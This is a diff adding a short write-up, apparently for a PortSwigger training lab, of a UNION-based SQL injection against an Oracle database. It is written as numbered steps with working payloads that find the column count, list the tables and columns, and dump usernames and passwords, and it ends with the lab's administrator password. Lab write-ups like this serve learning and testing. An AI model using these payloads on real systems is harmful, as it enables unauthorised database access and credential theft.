@@ -1,0 +1,28 @@
+#Step1: First of all check how many columns are present in the backend select statement using order by clause.
+
+1' order by 1--
+1' order by 2--
+
+
+
+#Step2: After finding the number of columns then use union attack to list all tables from the existing database.
+
+1' union select table_name,null from all_tables-- [this will list all tables]
+
+
+
+#Step3: After listing all table. Now pick the best table you think that it should contain username and password for all users. Let see what are the columns inside the 'USERS_YYOMDI' table
+
+1' union select column_name, null from all_tab_columns where table_name = 'USERS_YYOMDI'-- [this will list all columns from 'USERS_YYOMDI' table.]
+
+# We have successfully found the table that contains username and password for all users i.e 'USERS_YYOMDI'
+
+
+
+#Step4: Finally we have to dump the username and password from 'USERS_YYOMDI' table by using simple sql query.
+
+1' union select USERNAME_QWBAPJ,PASSWORD_NHAKTN from USERS_YYOMDI--
+
+# Password for administrator is adoibnhafylubq2fwjob.
+
+# Don't forget to read sqli cheatsheet provided by portswigger, it helps me a lot.
